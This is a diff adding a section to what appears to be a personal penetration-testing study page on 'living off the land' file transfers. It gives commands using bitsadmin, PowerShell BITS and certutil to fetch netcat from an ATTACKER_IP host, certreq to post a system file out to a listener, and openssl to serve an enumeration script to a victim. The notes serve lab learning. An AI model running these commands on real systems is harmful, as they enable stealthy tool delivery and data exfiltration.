@@ -335,6 +335,49 @@ html
                 </div>
             </div>
 
+            <div class="section">
+                <h3>🪓 Living off the Land – File Transfers</h3>
+                <p>Instead of uploading custom tools, I practiced abusing <strong>built-in binaries</strong> on Windows and Linux to move files. This “living off the land” approach is quieter because I’m just using software that’s already installed and usually trusted.</p>
+
+                <h4>Windows LOLBins (LOLBAS)</h4>
+                <p>Using common Windows binaries for download / upload:</p>
+                <ul class="method-list">
+                    <li>
+                        <strong>BITS (download)</strong><br>
+                        <code>bitsadmin /transfer wcb /priority foreground http://ATTACKER_IP/nc.exe C:\Temp\nc.exe</code><br>
+                        or in PowerShell:<br>
+                        <code>Import-Module bitstransfer; Start-BitsTransfer -Source "http://ATTACKER_IP/nc.exe" -Destination "C:\Temp\nc.exe"</code>
+                    </li>
+                    <li>
+                        <strong>certutil (download)</strong><br>
+                        <code>certutil.exe -verifyctl -split -f http://ATTACKER_IP/nc.exe</code>
+                    </li>
+                    <li>
+                        <strong>certreq (upload/exfil)</strong><br>
+                        Victim:<br>
+                        <code>certreq.exe -Post -config http://ATTACKER_IP:8000/ C:\Windows\win.ini</code><br>
+                        Attacker:<br>
+                        <code>nc -lvnp 8000</code>
+                    </li>
+                </ul>
+
+                <h4>Linux GTFOBins – OpenSSL “nc-style” Transfer</h4>
+                <p>On Linux, I used OpenSSL as an encrypted netcat replacement when <code>nc</code> wasn’t ideal:</p>
+                <p><strong>Attacker (serve file over TLS):</strong></p>
+                <div class="command-block">
+<code>openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out certificate.pem
+openssl s_server -quiet -accept 80 -cert certificate.pem -key key.pem &lt; /tmp/LinEnum.sh</code>
+                </div>
+                <p><strong>Victim (download file):</strong></p>
+                <div class="command-block">
+                    <code>openssl s_client -connect ATTACKER_IP:80 -quiet > LinEnum.sh</code>
+                </div>
+
+                <div class="highlight-box">
+                    <strong>Note:</strong> When I’m stuck on a box, I check <a href="https://lolbas-project.github.io/" target="_blank">LOLBAS</a> or <a href="https://gtfobins.github.io/" target="_blank">GTFOBins</a> for binaries that support <em>download</em> / <em>upload</em> and adapt one of these patterns.
+                </div>
+            </div>
+
             <!-- Misc methods + HTB module -->
             <div class="section">
                 <h3>🧰 Miscellaneous File Transfer Methods (HTB Module Practice)</h3>
